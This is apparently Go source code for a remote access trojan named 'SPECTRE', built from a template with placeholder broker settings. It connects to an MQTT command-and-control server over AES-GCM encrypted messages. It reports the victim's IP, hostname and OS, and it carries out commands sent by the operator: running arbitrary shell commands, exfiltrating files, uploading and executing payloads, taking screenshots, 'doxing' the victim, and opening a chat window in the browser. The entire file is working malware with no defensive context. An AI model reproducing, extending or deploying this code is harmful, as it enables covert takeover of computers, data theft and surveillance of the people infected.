package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand" // Alias crypto/rand to avoid conflict
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/eclipse/paho.mqtt.golang"
	"image/png"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/kbinani/screenshot"
)

var (
	brokerURL     = "{BROKER_URL}"
	brokerPort    = {BROKER_PORT}
	topic         = "{TOPIC}"
	botID         = "{BOT_ID}"
	apiToken      = "{API_TOKEN}"
	encryptionKey = "{ENCRYPTION_KEY}"

	client        mqtt.Client
	running       bool = true
	isConnected   bool
	isListed      bool
	currentDir    string
	infectedDate  string
	messageChan   chan string
	closeChan     chan bool
	replyChan     chan string
	httpServer    *http.Server
	chatActive    bool
	chatPort      int
	chatMessages  []string
	chatMutex     sync.Mutex
)

func encryptMessage(message string) string {
	key := []byte(encryptionKey)
	if len(key) < 16 {
		key = append(key, make([]byte, 16-len(key))...)
	} else if len(key) > 16 && len(key) < 24 {
		key = append(key, make([]byte, 24-len(key))...)
	} else if len(key) > 24 && len(key) < 32 {
		key = append(key, make([]byte, 32-len(key))...)
	} else if len(key) > 32 {
		key = key[:32]
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Printf("Bot %s encryption error: %v\n", botID, err)
		return message
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Printf("Bot %s encryption error: %v\n", botID, err)
		return message
	}

	nonce := make([]byte, aesgcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		fmt.Printf("Bot %s encryption error: %v\n", botID, err)
		return message
	}

	ciphertext := aesgcm.Seal(nil, nonce, []byte(message), nil)
	tag := ciphertext[len(ciphertext)-16:]
	pureCiphertext := ciphertext[:len(ciphertext)-16]
	encrypted := append(nonce, pureCiphertext...)
	encrypted = append(encrypted, tag...)
	return base64.StdEncoding.EncodeToString(encrypted)
}

func decryptMessage(encryptedMessage string) string {
	encryptedData, err := base64.StdEncoding.DecodeString(encryptedMessage)
	if err != nil {
		fmt.Printf("Bot %s decryption error: %v\n", botID, err)
		return encryptedMessage
	}

	key := []byte(encryptionKey)
	if len(key) < 16 {
		key = append(key, make([]byte, 16-len(key))...)
	} else if len(key) > 16 && len(key) < 24 {
		key = append(key, make([]byte, 24-len(key))...)
	} else if len(key) > 24 && len(key) < 32 {
		key = append(key, make([]byte, 32-len(key))...)
	} else if len(key) > 32 {
		key = key[:32]
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Printf("Bot %s decryption error: %v\n", botID, err)
		return encryptedMessage
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Printf("Bot %s decryption error: %v\n", botID, err)
		return encryptedMessage
	}

	nonceSize := aesgcm.NonceSize()
	if len(encryptedData) < nonceSize+16 {
		fmt.Printf("Bot %s decryption error: invalid encrypted data\n", botID)
		return encryptedMessage
	}

	nonce := encryptedData[:nonceSize]
	tag := encryptedData[len(encryptedData)-16:]
	ciphertext := encryptedData[nonceSize : len(encryptedData)-16]
	combinedCiphertext := append(ciphertext, tag...)
	plaintext, err := aesgcm.Open(nil, nonce, combinedCiphertext, nil)
	if err != nil {
		fmt.Printf("Bot %s decryption error: %v\n", botID, err)
		return encryptedMessage
	}

	return string(plaintext)
}

const chatHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>SPECTRE Chat</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 20px;
        }
        #chatArea {
            width: 100%;
            height: 300px;
            background-color: #2a2a2a;
            border: 2px solid #00ff00;
            padding: 10px;
            margin-bottom: 10px;
            overflow-y: scroll;
            white-space: pre-wrap;
        }
        #messageInput {
            width: 80%;
            background-color: #2a2a2a;
            color: #00ff00;
            border: 2px solid #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 5px;
        }
        button {
            background-color: #333333;
            color: #00ff00;
            border: 2px solid #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 5px 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #444444;
        }
    </style>
</head>
<body>
    <div id="chatArea"></div>
    <input type="text" id="messageInput" placeholder="Enter your reply (or press Enter to skip)">
    <button onclick="sendReply()">Send</button>
    <script>
        const chatArea = document.getElementById('chatArea');
        const messageInput = document.getElementById('messageInput');
        let lastMessageCount = 0;
        fetchMessages();
        setInterval(fetchMessages, 1000);
        function fetchMessages() {
            fetch('/messages')
                .then(response => response.json())
                .then(data => {
                    if (data.messages.length > lastMessageCount) {
                        chatArea.textContent = data.messages.join('\n');
                        lastMessageCount = data.messages.length;
                        chatArea.scrollTop = chatArea.scrollHeight;
                    }
                })
                .catch(err => console.error('Error fetching messages:', err));
        }
        messageInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendReply();
            }
        });
        function sendReply() {
            const reply = messageInput.value.trim();
            if (reply !== "") {
                fetch('/reply', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ reply: reply })
                }).then(response => response.json())
                  .then(data => {
                      if (data.status === 'success') {
                          messageInput.value = "";
                      }
                  }).catch(err => {
                      console.error('Error sending reply:', err);
                  });
            }
        }
    </script>
</body>
</html>
`

func init() {
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Printf("Error getting home directory: %v\n", err)
		currentDir = "."
	} else {
		currentDir = home
	}
	infectedDate = time.Now().Format(time.RFC3339)
}

type ConnectMessage struct {
	Type     string `json:"type"`
	ID       string `json:"id"`
	IP       string `json:"ip"`
	OS       string `json:"os"`
	Hostname string `json:"hostname"`
}

type CommandMessage struct {
	Type    string `json:"type"`
	Target  string `json:"target"`
	Action  string `json:"action"`
	Command string `json:"command,omitempty"`
	Message string `json:"message,omitempty"`
	File    string `json:"file,omitempty"`
	Data    string `json:"data,omitempty"`
}

type ResponseMessage struct {
	Type       string `json:"type"`
	ID         string `json:"id"`
	IP         string `json:"ip"`
	Message    string `json:"message,omitempty"`
	Result     string `json:"result,omitempty"`
	CurrentDir string `json:"current_dir,omitempty"`
	ZipData    string `json:"zip_data,omitempty"`
	FileData   string `json:"file_data,omitempty"`
}

func sendPresence(client mqtt.Client) {
	hostname, _ := os.Hostname()
	ip, err := getLocalIP()
	if err != nil {
		fmt.Printf("Error getting local IP: %v\n", err)
		return
	}
	osInfo := runtime.GOOS
	connectMsg := ConnectMessage{
		Type:     "connect",
		ID:       botID,
		IP:       ip,
		OS:       osInfo,
		Hostname: hostname,
	}
	msgBytes, _ := json.Marshal(connectMsg)
	encryptedMsg := encryptMessage(string(msgBytes))
	client.Publish(topic, 1, false, encryptedMsg)
	fmt.Printf("Bot %s sent presence: %s\n", botID, string(msgBytes))
}

func sendPresencePeriodically() {
	for running {
		if isConnected {
			if isListed {
				sendPresence(client)
				time.Sleep(24 * time.Hour)
			} else {
				sendPresence(client)
				isListed = true // Assume listed after sending presence
				time.Sleep(24 * time.Hour)
			}
		} else {
			time.Sleep(5 * time.Minute)
		}
	}
}

func onConnect(client mqtt.Client) {
	client.Publish(topic, 1, true, nil)
	fmt.Printf("Bot %s cleared retained messages on topic %s\n", botID, topic)
	client.Subscribe(topic, 1, nil)
	fmt.Printf("Bot %s subscribed to topic %s\n", botID, topic)
	isConnected = true
	sendPresence(client)
	isListed = true
}

func onDisconnect(client mqtt.Client, err error) {
	fmt.Printf("Bot %s disconnected from MQTT broker: %v\n", botID, err)
	isConnected = false
	isListed = false
}

func getLocalIP() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			default:
				continue
			}
			if ip.To4() != nil && !ip.IsLoopback() && !ip.IsLinkLocalUnicast() {
				return ip.String(), nil
			}
		}
	}
	hostname, err := os.Hostname()
	if err != nil {
		return "", err
	}
	addrs, err := net.LookupHost(hostname)
	if err != nil || len(addrs) == 0 {
		return "", err
	}
	for _, addr := range addrs {
		ip := net.ParseIP(addr)
		if ip == nil {
			continue
		}
		if ip.To4() != nil && !ip.IsLoopback() && !ip.IsLinkLocalUnicast() {
			return ip.String(), nil
		}
	}
	return "127.0.0.1", nil
}

func executeShellCommand(command string) string {
	command = strings.TrimSpace(command)
	if strings.ToLower(command) == "dir" || strings.ToLower(command) == "ls" {
		dirEntries, err := os.ReadDir(currentDir)
		if err != nil {
			return fmt.Sprintf("Error listing directory: %v", err)
		}
		var entries []string
		for _, entry := range dirEntries {
			entries = append(entries, entry.Name())
		}
		return strings.Join(entries, "\n")
	} else if len(command) >= 3 && strings.ToLower(command[:3]) == "cd " {
		newDir := strings.TrimSpace(command[3:])
		if newDir == "" {
			return "No directory specified"
		}
		var newPath string
		if filepath.IsAbs(newDir) {
			newPath = newDir
		} else {
			newPath = filepath.Join(currentDir, newDir)
		}
		if _, err := os.Stat(newPath); os.IsNotExist(err) {
			return fmt.Sprintf("Directory not found: %s", newPath)
		}
		currentDirnew, err := filepath.Abs(newPath)
		if err != nil {
			return fmt.Sprintf("Error resolving path: %v", err)
		}
		currentDir = currentDirnew
		return ""
	} else {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", command)
		} else if runtime.GOOS == "darwin" {
			cmd = exec.Command("sh", "-c", command)
		} else {
			cmd = exec.Command("bash", "-c", command)
		}
		cmd.Dir = currentDir
		output, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Error executing command: %v\nOutput: %s", err, output)
		}
		return string(output)
	}
}

func createDoxZip() string {
	ip, err := getLocalIP()
	if err != nil {
		fmt.Printf("Error getting local IP: %v\n", err)
		ip = "unknown"
	}
	data := map[string]string{
		"ip":           ip,
		"id":           botID,
		"infected_date": infectedDate,
	}
	dataBytes, _ := json.Marshal(data)
	return base64.StdEncoding.EncodeToString(dataBytes)
}

func takeScreenshot() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n < 1 {
		return "", fmt.Errorf("no active displays found")
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", fmt.Errorf("error capturing screenshot: %v", err)
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return "", fmt.Errorf("error encoding screenshot to PNG: %v", err)
	}

	encodedData := base64.StdEncoding.EncodeToString(buf.Bytes())
	return encodedData, nil
}

func handleMessageInteraction(message string) {
	chatMutex.Lock()
	if chatActive {
		chatMessages = append(chatMessages, fmt.Sprintf("Received: %s", message))
		chatMutex.Unlock()
		fmt.Printf("Appended message to existing chat session\n")
		return
	}

	chatMessages = []string{fmt.Sprintf("Received: %s", message)}
	chatActive = true
	chatPort = rand.Intn(65535-49152) + 49152
	addr := fmt.Sprintf("localhost:%d", chatPort)
	chatMutex.Unlock()

	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("spectre_chat_%s.html", botID))
	err := ioutil.WriteFile(tempFile, []byte(chatHTML), 0644)
	if err != nil {
		fmt.Printf("Error writing chat HTML to temp file: %v\n", err)
		chatActive = false
		return
	}
	defer os.Remove(tempFile)

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, tempFile)
	})
	mux.HandleFunc("/messages", func(w http.ResponseWriter, r *http.Request) {
		chatMutex.Lock()
		defer chatMutex.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string][]string{"messages": chatMessages})
	})
	mux.HandleFunc("/reply", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var replyData struct {
			Reply string `json:"reply"`
		}
		if err := json.NewDecoder(r.Body).Decode(&replyData); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}
		chatMutex.Lock()
		chatMessages = append(chatMessages, fmt.Sprintf("Sent: %s", replyData.Reply))
		chatMutex.Unlock()
		replyChan <- replyData.Reply
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "success"})
	})

	httpServer = &http.Server{
		Addr:    addr,
		Handler: mux,
	}

	go func() {
		if err := httpServer.ListenAndServe(); err != http.ErrServerClosed {
			fmt.Printf("HTTP server error: %v\n", err)
		}
	}()

	url := fmt.Sprintf("http://%s", addr)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "start", url)
	} else if runtime.GOOS == "darwin" {
		cmd = exec.Command("open", url)
	} else {
		cmd = exec.Command("xdg-open", url)
	}
	if err := cmd.Start(); err != nil {
		fmt.Printf("Error opening browser: %v\n", err)
		chatActive = false
		return
	}
	fmt.Printf("Opened browser for chat at %s\n", url)

	<-closeChan
	fmt.Printf("Chat session closed due to close_message command\n")

	if err := httpServer.Close(); err != nil {
		fmt.Printf("Error closing HTTP server: %v\n", err)
	}
	chatMutex.Lock()
	chatActive = false
	chatMessages = nil
	chatPort = 0
	httpServer = nil
	chatMutex.Unlock()
}

func onMessage(client mqtt.Client, msg mqtt.Message) {
	var data CommandMessage
	encryptedMessage := string(msg.Payload())
	if encryptedMessage == "" {
		fmt.Printf("Bot %s received empty message, ignoring\n", botID)
		return
	}

	message := decryptMessage(encryptedMessage)
	if err := json.Unmarshal([]byte(message), &data); err != nil {
		fmt.Printf("Bot %s error decoding message: %v\n", botID, err)
		return
	}
	fmt.Printf("Bot %s received message: %s\n", botID, message)

	if data.Type == "command" {
		target := data.Target
		fmt.Printf("Bot %s target: %s\n", botID, target)
		if target == "all" {
			fmt.Printf("Bot %s processing command for 'all'\n", botID)
			action := data.Action
			fmt.Printf("Bot %s action: %s\n", botID, action)
			processAction(action, data)
		} else {
			lastColonIndex := strings.LastIndex(target, ":")
			if lastColonIndex == -1 {
				fmt.Printf("Bot %s invalid target format: %s\n", botID, target)
				return
			}
			targetIP := target[:lastColonIndex]
			targetID := target[lastColonIndex+1:]
			fmt.Printf("Bot %s target parts: [IP: %s, ID: %s]\n", botID, targetIP, targetID)

			ip, err := getLocalIP()
			if err != nil {
				fmt.Printf("Error getting local IP: %v\n", err)
				return
			}
			normalizedTargetIP := targetIP
			normalizedLocalIP := ip
			if targetIP == "::1" || targetIP == "127.0.0.1" {
				normalizedTargetIP = "localhost"
			}
			if ip == "::1" || ip == "127.0.0.1" {
				normalizedLocalIP = "localhost"
			}
			fmt.Printf("Bot %s comparing: ip=%s, target_ip=%s, bot_id=%s, target_id=%s\n", botID, normalizedLocalIP, normalizedTargetIP, botID, targetID)
			if normalizedTargetIP == normalizedLocalIP && targetID == botID {
				fmt.Printf("Bot %s target matches\n", botID)
				action := data.Action
				fmt.Printf("Bot %s action: %s\n", botID, action)
				processAction(action, data)
			} else {
				fmt.Printf("Bot %s target does not match: ip mismatch (%s != %s) or id mismatch (%s != %s)\n", botID, normalizedLocalIP, normalizedTargetIP, botID, targetID)
			}
		}
	}
}

func processAction(action string, data CommandMessage) {
	ip, err := getLocalIP()
	if err != nil {
		fmt.Printf("Error getting local IP: %v\n", err)
		return
	}
	switch action {
	case "ping":
		fmt.Printf("Bot %s processing ping command\n", botID)
		if isListed {
			sendPresence(client)
		}
	case "shell":
		command := data.Command
		result := executeShellCommand(command)
		response := ResponseMessage{
			Type:       "shell_response",
			ID:         botID,
			IP:         ip,
			Result:     result,
			CurrentDir: currentDir,
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		client.Publish(topic, 1, false, encryptedMsg)
		fmt.Printf("Bot %s sent shell response: %s\n", botID, string(msgBytes))
	case "download":
		fileName := data.File
		filePath := filepath.Join(currentDir, fileName)
		fileInfo, err := os.Stat(filePath)
		if err != nil {
			fmt.Printf("Bot %s error accessing file %s: %v\n", botID, filePath, err)
			return
		}
		if fileInfo.IsDir() {
			fmt.Printf("Bot %s cannot download directory %s\n", botID, filePath)
			return
		}
		fileData, err := ioutil.ReadFile(filePath)
		if err != nil {
			fmt.Printf("Bot %s error reading file %s: %v\n", botID, filePath, err)
			return
		}
		encodedData := base64.StdEncoding.EncodeToString(fileData)
		response := ResponseMessage{
			Type:     "download_response",
			ID:       botID,
			IP:       ip,
			FileData: encodedData,
			Message:  fileName,
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		client.Publish(topic, 1, false, encryptedMsg)
		fmt.Printf("Bot %s sent download response for file %s\n", botID, fileName)
	case "upload":
		fileName := data.File
		filePath := filepath.Join(currentDir, fileName)
		fileData, err := base64.StdEncoding.DecodeString(data.Data)
		if err != nil {
			fmt.Printf("Bot %s error decoding file data for %s: %v\n", botID, fileName, err)
			return
		}
		err = ioutil.WriteFile(filePath, fileData, 0644)
		if err != nil {
			fmt.Printf("Bot %s error writing file %s: %v\n", botID, filePath, err)
			return
		}
		response := ResponseMessage{
			Type:    "upload_response",
			ID:      botID,
			IP:      ip,
			Message: fmt.Sprintf("File %s uploaded successfully", fileName),
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		client.Publish(topic, 1, false, encryptedMsg)
		fmt.Printf("Bot %s sent upload response for file %s\n", botID, fileName)
	case "execute":
		fileName := data.File
		filePath := filepath.Join(currentDir, fileName)
		fileInfo, err := os.Stat(filePath)
		if err != nil {
			fmt.Printf("Bot %s error accessing file %s: %v\n", botID, filePath, err)
			return
		}
		if fileInfo.IsDir() {
			fmt.Printf("Bot %s cannot execute directory %s\n", botID, filePath)
			return
		}
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", filePath)
		} else {
			cmd = exec.Command("sh", "-c", filePath)
		}
		cmd.Dir = currentDir
		err = cmd.Start()
		if err != nil {
			fmt.Printf("Bot %s error executing file %s: %v\n", botID, filePath, err)
			return
		}
		response := ResponseMessage{
			Type:    "execute_response",
			ID:      botID,
			IP:      ip,
			Message: fmt.Sprintf("File %s executed", fileName),
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		client.Publish(topic, 1, false, encryptedMsg)
		fmt.Printf("Bot %s sent execute response for file %s\n", botID, fileName)
	case "screenshot":
		encodedData, err := takeScreenshot()
		if err != nil {
			fmt.Printf("Bot %s error taking screenshot: %v\n", botID, err)
			return
		}
		response := ResponseMessage{
			Type:     "screenshot_response",
			ID:       botID,
			IP:       ip,
			FileData: encodedData,
			Message:  fmt.Sprintf("screenshot_%s.png", time.Now().Format("20060102_150405")),
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		client.Publish(topic, 1, false, encryptedMsg)
		fmt.Printf("Bot %s sent screenshot response\n", botID)
	case "dox":
		fmt.Printf("Bot %s processing dox command\n", botID)
		zipData := createDoxZip()
		response := ResponseMessage{
			Type:    "dox_response",
			ID:      botID,
			IP:      ip,
			ZipData: zipData,
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		client.Publish(topic, 1, false, encryptedMsg)
		fmt.Printf("Bot %s sent dox response\n", botID)
	case "message":
		message := data.Message
		go handleMessageInteraction(message)
	case "close_message":
		fmt.Printf("Bot %s received close_message command\n", botID)
		closeChan <- true
	case "disconnect":
		fmt.Printf("Bot %s received disconnect command\n", botID)
		client.Disconnect(250)
		running = false
		os.Exit(0)
	}
}

func connectWithBackoff() {
	backoffDurations := []time.Duration{
		1 * time.Minute,
		2 * time.Minute,
		5 * time.Minute,
	}
	attempt := 0

	for running && !isConnected {
		if attempt >= len(backoffDurations) {
			attempt = len(backoffDurations) - 1
		}
		duration := backoffDurations[attempt]

		fmt.Printf("Bot %s attempting to connect to MQTT broker (attempt %d, waiting %v)\n", botID, attempt+1, duration)
		if token := client.Connect(); token.Wait() && token.Error() != nil {
			fmt.Printf("Bot %s failed to connect to MQTT broker: %v\n", botID, token.Error())
			time.Sleep(duration)
			attempt++
			continue
		}
		fmt.Printf("Bot %s successfully connected to MQTT broker\n", botID)
		client.Subscribe(topic, 1, onMessage)
		attempt = 0
	}
}

func main() {
	fmt.Printf("Bot %s starting up, waiting for messages...\n", botID)

	rand.Seed(time.Now().UnixNano())

	messageChan = make(chan string)
	closeChan = make(chan bool)
	replyChan = make(chan string)

	opts := mqtt.NewClientOptions()
	opts.AddBroker(fmt.Sprintf("tcp://%s:%d", brokerURL, brokerPort))
	opts.SetClientID(fmt.Sprintf("rat_bot_%s", botID))
	opts.SetKeepAlive(120 * time.Second)
	opts.SetOnConnectHandler(onConnect)
	opts.SetConnectionLostHandler(onDisconnect)
	if apiToken != "" {
		opts.SetUsername(apiToken)
	}
	client = mqtt.NewClient(opts)

	go sendPresencePeriodically()

	for running {
		connectWithBackoff()
		for running && isConnected {
			select {
			case reply := <-replyChan:
				if reply != "" {
					ip, err := getLocalIP()
					if err != nil {
						fmt.Printf("Error getting local IP: %v\n", err)
						continue
					}
					response := ResponseMessage{
						Type:    "message_response",
						ID:      botID,
						IP:      ip,
						Message: reply,
					}
					msgBytes, _ := json.Marshal(response)
					encryptedMsg := encryptMessage(string(msgBytes))
					client.Publish(topic, 1, false, encryptedMsg)
					fmt.Printf("Bot %s sent message reply: %s\n", botID, string(msgBytes))
				}
			default:
				time.Sleep(100 * time.Millisecond)
			}
		}
		if !running {
			break
		}
	}

	if running {
		client.Disconnect(250)
	}
}